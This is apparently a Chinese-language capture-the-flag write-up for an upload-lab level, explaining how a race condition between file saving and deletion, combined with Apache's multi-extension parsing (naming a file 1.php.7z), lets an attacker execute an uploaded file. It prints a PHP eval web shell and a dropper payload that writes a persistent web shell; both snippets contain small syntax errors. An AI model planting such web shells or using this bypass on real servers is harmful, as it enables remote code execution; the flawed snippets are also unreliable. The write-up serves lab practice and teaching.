## 解题wp(By:独立团孙德胜Alan)
本pass主要考察条件竞争，以及后缀名绕过

## 1.打开第十八关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)

 

## 3.分析代码

##### 本Pass解除了利用文件包含漏洞，仔细读代码发现源码中先判断move_uploaded_file函数是否执行成功，然后再判断上传的文件后缀名是否在白名单中，如果不在白名单中则用unlink函数删除文件。

##### 可以通过条件竞争的方式在unlink函数执行之前访问上传文件。

##### 然后又加了限制，白名单中存在.7z，apache不能解析，因此可以利用apache的解析漏洞，命名文件为1.php.7z，这样，apche从右往左解析时，遇到.7z不认识，就把这个文件当作.php来解析

## 4.我们可以通过上传一个能生成新的文件的木马，然后不停访问它

使用Burpsuite抓包上传shell.php.7z
内容：

```
<?php fputs(fopen('Alan.php','w'),'<?php @eval($_POST["Alan"])?>’);?>
```

剩下的和第17关一样
